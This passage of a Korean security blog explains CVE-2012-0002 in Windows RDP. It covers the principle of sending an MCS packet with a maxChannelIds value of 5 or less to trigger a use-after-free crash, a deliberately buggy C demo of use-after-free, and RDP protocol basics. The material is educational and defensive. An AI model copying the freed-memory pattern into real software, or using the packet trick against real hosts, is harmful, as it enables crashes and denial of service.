operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> window XP              <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Vista Ultimate  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2003</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window <span class=\"token number\">7</span>               <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2008</span><span class=\"token punctuation\">,</span> R2 <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<h2 id=\"cve-2012-0002-취약점-원리\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\" aria-label=\"cve 2012 0002 취약점 원리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 원리</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADn0lEQVQ4y2WSbUxTZxTHT6sMO5UFBSMdSjvpy1paB3W0XIrVipS2YGnvfW5b7nBURQR0y0Jx8jIiyZB1Gs0ynU1mMrcZJx/2kmVvZsmW+GHZJiNzM2ZfWCZuc31B2gAWVnrPcssgS3aSk+fJk/x/Oef/f4AnBP5tEc9xgACwdl2RCJZqo9a6MxFw1fHm7RQWyfVDGsMuYH0HVyMixKcfwv/qP8AsFB0O0dmeQfEroTC8GBwuVxmMf7/b2JB5Vm9ES6P/U0EjwGLhN0XodouzgyzrWXYFuIonZLNwxyoTpL8dg0RyXhaJz0yev/AWSuX6tMvTkh4bv4Nz8/iCAEQRANL0sl6cPRlmBSjjCbnKs2wdT9PBTHOz5X5y/vbM3CJ+8vnXyLW0Y9/AKbwfTWI8kcLYH7EjaKr08RzXyROSv2KZ2w2AHg/wQhNyFFl2AFm2BGuqH40n5y9Fp2an41OzkblUJpaYWYhG4jOR2IO53+LRhBUBJDzHWXlCRnhCCoXpshMKIUy1d25aZL0/z3p9CiRM1iOhJv+alv6AmIeIaxExL5ZIFT9IpNbFIomsTvAsQ8jriwzzBvp98OFe+2poD12EA4InapliGGCNtsxE6cpMRq3WVA0Aa7DBeWSkrIIGkKi+4xH+vBeF6OUrq9BhF2PbIcDW1sfxuWPy4YKipZStXEcPO3y+v7b/dB/VtL8xPyd/fZmeKoZthsKenbvhOk1GuXoXUrsbJt4OncnJpuzzAh4ILH8U4W0jAAjETdBx7ToO3Yng4PhdDIRHR7sTS+su+v1y0DGgdzDBWieNdjt9q8/XkttFc7BAyJZo68HNoXNX4Jn+14ZOvH/jYe8X43fbwh9NQiB8LVZDtyY9J0aQvfRBCFVPlKd9/pMLDPkeWdJmcni6bY4mrKl13Zxi2Uok5DhPyFdpv//cex9/A23vfHk5/EsMP7v1K/be/B1BvkXtVKoqMgrFU2NbC0ukig1SwI7DMEETKdi8UOegB5wNDNrqPbfr61yPTBAvpBhScK95f95AMATOwy/tY7pfvUEfPfkjffzsBXhSV6VXa429aq2xS7PdnKfRU3DRWi/GYACaLHawWOx91dRepMy2n7Lp682AXhawq3PZQwkAbJVAjgEApLBNrgOVegcoVQYoLigBnbICjDoTULqq9eW6qgJZabmmVL3DXaqs2KVUPy1TaSpLXjbvEeOxLthn90LlHk+u/VBQwjw/mGu0sY/9A4hEr7W7ho5OAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image22\"\n        title=\"image22\"\n        src=\"/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png\"\n        srcset=\"/static/be29eddf484fb717699e8161603d7ad1/e9ff0/image22.png 180w,\n/static/be29eddf484fb717699e8161603d7ad1/f21e7/image22.png 360w,\n/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP가 사용되는 동작 방식은 네트워크 관리자가 다른 컴퓨터를 통해 원격으로\n접속하는 동안에 해당 RDP 서비스를 인터넷을 통해 공유되고 있는 상태에서\n발생된다. RDP는 메모리에 있는 패킷을 처리할 수 없기 때문에 이를 통해\n공격자는 초기화에 실패했거나 현재 실행중인 개체에 대해 T.125\nConnectMCSPDU 패킷의 maxChannelids 필드 값을 5이하로 설정하여\nUse-After-Free 취약점이 발생시킬 수 있는 변조된 RDP MCS 패킷 바이트를\n페이로드로 작성하여 전송을 하여 공격 대상의 단말기에 BSOD 장애를\n발생시켜 가용성을 무너트릴 수 있는 방식이다.</p>\n<p>’</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">※ BlueScreen Of <span class=\"token function\">Death</span> <span class=\"token punctuation\">(</span>BSOD<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> 마이크로소프트 윈도우 운영체제에서 시스템\n오류를 복구하지 못할 때 나타나는 화면</code></pre></div>\n<h2 id=\"공격-기법-및-기본-개념\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\" aria-label=\"공격 기법 및 기본 개념 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 및 기본 개념</h2>\n<h3 id=\"uaf-use-after-free\" style=\"position:relative;\"><a href=\"#uaf-use-after-free\" aria-label=\"uaf use after free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UAF (Use-After-Free)</h3>\n<p>C, C++ 언어를 활용하여 개발을 진행할 때 수동으로 동적 메모리를 할당을\n하여 관리를 한다. 메모리를 기준에 맞게 관리를 하지 못하여 해제된\n메모리에 접근을 시도하거나 메모리를 할당한 후 해제를 하지 않아 메모리\n누수가 발생되어 큰 문제를 야기시킨다. 동적 메모리를 올바르게 관리하지\n않아 발생하는 취약점 중 하나이다.</p>\n<p>Use-After-Free 취약점은 해제된 메모리에 접근을 하여 값을 쓸 수 있는\n취약점이다. UAF 취약점이 존재하는 소스 코드를 통해 과정을 살펴보겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\\#include \\<span class=\"token operator\">&lt;</span>stdio<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>stdlib<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>string<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">char</span> \\<span class=\"token operator\">*</span>bufA <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*1. bufA 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*bufA 메모리 해제*/</span>\n\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>bufB <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufB 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufB<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Exploit Zer0Luck\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufA 변수에 문자열 복사 (UAF)*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>bufA 변수의 메모리를 총 150바이트 크기만큼 할당한 후 strcpy 함수를 통해\n“boan Project” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABlElEQVQY02NQcbUQdJuTVOq8MKHSaV58hdPihAqn2fEVDoviK2wmRrS5TU7odpgc3WI3Nbrdrjeyw2F2bIPTgoRyp4XxlY5z4yqc5sZXeC9Lr3Cuj6pSktMvZFDytjAOPVryP/RK+f+gCyX/g66V/Q85Wfrf50rhf49zuf/Db1b997tQ9N//Wsn/oJPF//2vl/wPvVj+P+hy6X+/c4X/fc7m/4++Vfs/aEnOfzUl4/8MVlVBvLZLYiPN6gMdLTtD3C27Q93MW4LcrLrD3Cxbgt3NuoPdzVuC3S27Qt3Nm4PcrbpC3SzaQ9wsO0PdLNpC3Czagt3MeoPdTIt93U31HBwYgv836IX9b7W1mR/NYD0jksF2bjSD9bQIBrv5MQw206MYrBZEQcTnxTBYT4tksJsXw2AzKwqszmZmFBhbLYxisGgKZjDVdWBgCPxVpx/4vdbE712lIAMDA4PzjlRmu4WxzA6rEpjtF8UxO65JZLZfHAfmg8QdVyUyOyyLZ3ZYkcBsvyQOjB3WJTLbdkYwG2nZMgEARD2dwbxMpnMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image23\"\n        title=\"image23\"\n        src=\"/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png\"\n        srcset=\"/static/7e931fd96dc6fa8297279d0b112b1289/e9ff0/image23.png 180w,\n/static/7e931fd96dc6fa8297279d0b112b1289/f21e7/image23.png 360w,\n/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA 메모리를 해제한 후 새로운 150바이트 크기의 메모리를 bufB에\n할당한다. strcpy 함수를 통해 “Exploit Zer0Luck” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABTElEQVQY06WQzStEUQDFzyxYKBYsEJKSDLJQ4j+gNPPeve8+Y4adf8PGgoUlO4WkLFnYkWc+3vX17h01C7OzlCIiksKREMrOqdOp0zmbH5jJDAIAyd9enIt99FfgzFTsvftz98OoaQGmu/tqOT8L8hzcWwevS+Dywvu3EvWdPWjsbkdDvBfVrW1AXR1XF8DLEni8Be6sgadZ8PEMvCijojkOGD91kndkIatS2jhSh9LXeaG0Tbj72460wdBIdJAUJpB+lHW9IytUGEhfh46no6TQgVD6JD2ul8Soburoy8FIv5xzvWjPH7MmKWxBKJsTytqEY/OOjMLhEVN0PVNQKRMKZaz0bSCUDV3PRgnXBq6yxdG0XXFUsbVr4Bi4n6wlNz84PJVAvoB8BW8PQT6B5Q2QNz9YPXzmLXgXgXz+ZljVCExwuh+7El/Q/6s3cl3ftnkn3r4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image24\"\n        title=\"image24\"\n        src=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png\"\n        srcset=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/e9ff0/image24.png 180w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/f21e7/image24.png 360w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA의 메모리 상태를 보면 주소의 값은 바뀌지 않았다. 메모리 bufA, bufB가\n같은 주소를 가리키고 있다는 점을 알 수 있다. 이미 해제되었던 메모리 bufA\n가 메모리 할당자로 들어가고 새로운 메모리 영역을 할당할 때 메모리를\n효율적으로 관리하기 위해 기존에 해제하였던 메모리가 그대로 대입되어\n발생하는 현상이다.</p>\n<p>이미 해제되었던 메모리 bufA에 접근을 하면 bufB가 같이 영향을 받기 때문에\n개발자가 의도하지 않은 정상적인 범위를 벗어나게 되어 문제가 생긴다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAACGklEQVQozyWK3U9ScQCG3/ljbV10UVktNFypa3WhskkBCvFlcU5wDnAO31ORck3gcABFZ5YtDpZ1k2ZZW10hbK1/xCFHSFl50bruH6i2rn4Nu3revc+DP7EI/3MqoqMQMVeKaqxv4mSsFNQAQDcu4AS6oEUfzuAsTuEkWDXbNf4iTCwbUWLdiBHrqxhxbE8RY4ojgzo9Ab0tGtZWIuj7EIV5MwzruzjMqwK06Dndg37defSeu6y5fq0XVy5qoevmfy3DvB6EZSsKy+sYbJtxON9P42aKw8AlPfBgJTw79Ez0j5XFoFERRHNZFM1rwcCNIn/fmOaKxpwvbZC8BUOOkww5b9r4JBAzPRcDplKnDYrjSki0vowKo0kmNKDTMxB3F2mwvUSFwyIVWkUa6PBLkboOUzRy9JAK7UXKHc3T0LdlyrfnqdAuHvf+gwXqay9Q38E8nfy+Sr1bs7S/Z4TC9Sm57qgknjprM4qzMqM4qgnFsZNQrDuTir2aKNsqU4qtOq04a0nFXulwRnHVkseNvZb47z4nS7dWwmvDV8eWEKClUf7HArhdGfxeHp59GR5VxoSaAtvMwt3IgGlmwbcKYBtZeJs5+FoFeBoy7jZluNUM+K8FMNv3MDRgAvx/H/P+34+0HymFp53XsA2JsHWJTNTnCKtmibueIW41QzyqfLw7n2dfJkxdIkxDIu69DPEe5smdtwkyPGgm/wAnY9ITzaeFbgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image25\"\n        title=\"image25\"\n        src=\"/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png\"\n        srcset=\"/static/a97169337b1417ed6d1bf5d77d59c810/e9ff0/image25.png 180w,\n/static/a97169337b1417ed6d1bf5d77d59c810/f21e7/image25.png 360w,\n/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해제된 포인터 bufA와 새로 할당된 bufB가 같은 메모리 영역을 가리키고 있기\n때문에 포인터 bufA에 “boan Project” 문자열을 복사한 후 포인터 bufB의\n내용을 출력하면 문자열이 바뀐 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAoUlEQVQI1x3CSw6CMBQAQO7gBfqD0g+igJigQssrSIFEWcnCndfw8EYmE4zj9FrX57KAc977YfCDH+dptq7bfb7s8Ybb1XV9VV2MMXXdlOWZRyLPy32aBca2LTjbQt2YLD8JoYVMpEq4kCgtiD4oqbVO41gqpaXSEReM8YhLFsYBQNcCWHD93R+zApMQ4RBhhijDlBLC8JZsMaGEMkpDTP5/0cgkaWepZfsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image26\"\n        title=\"image26\"\n        src=\"/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png\"\n        srcset=\"/static/385c0dee899a171d502c51fe88420cb6/e9ff0/image26.png 180w,\n/static/385c0dee899a171d502c51fe88420cb6/f21e7/image26.png 360w,\n/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>메모리를 부여하는 동적 메모리 함수들은 환경에 따라 다르겠지만 효율성을\n위해 이미 해제하였던 메모리를 재사용한다. 이렇게 해제된 메모리 포인터에\n만약 데이터를 쓰게 된다면 다른 영역에서 사용하고 있던 메모리에 데이터가\n작성이 되어 큰 문제를 발생한다.</p>\n<p>프로그램을 개발하면서 대규모로 진행되어 구조가 복잡 해질수록 UAF\n취약점은 코드 영역에서 부분적으로 나타난다. 구성이 다른 컴포넌트들이\n결합된 형태의 프로그램에서 두 컴포넌트가 서로 연결성을 띄면서 동작하는\n경우 컴포넌트에서 객체나 메모리의 사용을 끝났다고 인지하여 해제를\n하였지만 다른 컴포넌트에서는 해제되었다는 사실을 알지 못한 채 해제된\n메모리를 그대로 사용할 수 있게 된다.</p>\n<p>힙 메모리를 사용하는 프로그램에서는 메모리를 할당하는 부분이 동작이 다\n다르기 때문에 UAF 취약점의 영향력은 판단하기가 어렵다. 현존하는\n프로그램에서 공격이 불가능하다고 알려진 버그가 UAF 취약성을 통해서\n실제로는 공격이 가능했던 취약점인 경우가 많이 발생한다.</p>\n<h3 id=\"rdp-remote-desktop-protocol\" style=\"position:relative;\"><a href=\"#rdp-remote-desktop-protocol\" aria-label=\"rdp remote desktop protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP (Remote Desktop Protocol)</h3>\n<p><strong>1. RDP (Remote Desktop Protocol) 이해</strong></p>\n<p>RDP 프로토콜은 기본적으로 원격 컴퓨터 시스템과의 연결에 있어서 그래픽\n적인 기능을 만족하도록 설계가 되었으며 사용자의 컴퓨터와 원격 컴퓨터\n시스템과의 동작 사이에 확장적인 전송 메커니즘을 제공한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n <span class=\"token number\">1.</span>  비디오 드라이버를 사용하여 렌더링 정보를 네트워크 패킷으로       \n     구성하고 네트워크를 통해 네트워크를 통해 클라이언트로 전송하여   \n     디스플레이 출력을 렌더링 한다<span class=\"token punctuation\">.</span>                                   \n                                                                      \n <span class=\"token number\">2.</span>  클라이언트에서 RDP 프로토콜은 렌더링 데이터를 받고 패킷을 해당   \n     그래픽 장치 인터페이스 <span class=\"token punctuation\">(</span>GDI<span class=\"token punctuation\">)</span> API 호출로 해석한다<span class=\"token punctuation\">.</span>                \n                                                                      \n <span class=\"token number\">3.</span>  입력 경로의 경우 클라이언트 마우스 및 키보드 이벤트가            \n     클라이언트에서 서버로 리다렉션된다<span class=\"token punctuation\">.</span>                              \n                                                                      \n <span class=\"token number\">4.</span>  서버에서 RDP 프로토콜은 자체 키보드 및 마우스 드라이버를         \n     사용하여 이벤트를 수신한다<span class=\"token punctuation\">.</span>                                      \n</code></pre></div>\n<p><strong>2. RDP 프로토콜 기능</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 88.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACwUlEQVQ4y12TX2+cOBTF+XSdmSRqlSbbavd1V6oq9WU/aaSEAAM2xhgbmzH/DBjMQGY1uI2q/T1avr73nHvsfPz057fv/959/Hp79+X27svu8Hl/87g7PHzY3+8Pn/eHh7//+fHp/q8Pu/ub28fd/npyc/vH7vBwuHl0lFJSSqWUMYZzHsdxkiS+77+8vEAYI4Rc10UIAQAIIVEEoijKsgwAkCTJtZgx1ratMUZrzRhN0xQhFIYhYwxjjDYIIXiDc57nuda6bdtr8dvbm9qQUvq+nySJt5EkSRAEEMLj8RhuQAgRQhDCLMsopU7f98uyjOM4z/O6rgihOI4hhFrraZqMMcuyzPNsjBnHcVmWaZqWZTmfz+u6OhhjSinnfF3X0+lkZ2OM0Q0hBGPM9uGcJ0mCEFJKaa2HYXCmabpcLtM0zfM8TRPZKIqCbVj9VrmUEiGU5zlCSAhRlqVTVdU4jlVVNU3Ttu3z87PneWEYep73+vrqum4URa7rBkHg+34QBJ7nAXD1vCiK/3fOsqwoirIszcb7+TAMWmu7kXEclVJd1zmccyllVVXLsrRtCwCw8qSUVnxVVVZ813VlWRZFIYTgnCulnLIsu65TStkOlFJCCKXU7kNKGYZhmqbGmK7r+r7vuq5pmmEYrsXvY9shIYQYY0IIQihNU+sfY4wQUtd13/dt20opf4bkd8OqqvI8L4oiG5LjLwAAT09PdqmUUps8zrkzDIOU0hhjQ5LnOcY4SRJKqdUvhLBC+IYQAmOcZdnpdHKaptFa2z1N08QYsz0JIZ7nBUEAAMAYCyHqum426rq2mbtm+3w+d11njCGEAAAQQsfjMYqieMP2hxD6vh/Hse/7jDEpZdM0jg0g59wmXAhhl2QNew8Z+UUURQAA+9BPt20kLpcLhDCOY0ppVVXv/+F8Ps8b9prWep7ncRz/A2eNtClCqacLAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 2\"\n        title=\"image 5 4 2\"\n        src=\"/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png\"\n        srcset=\"/static/d1f902f659ebffcc4633f758357c5ded/e9ff0/image-5.4.2.png 180w,\n/static/d1f902f659ebffcc4633f758357c5ded/f21e7/image-5.4.2.png 360w,\n/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. RDP 기반의 애플리케이션 설계 구성</strong></p>\n<p>RDP 기반의 애플리케이션을 설계 구성요소로 터미널 서버, 전송 프로토콜,\n클라이언트 로 구성된다. 일반적으로 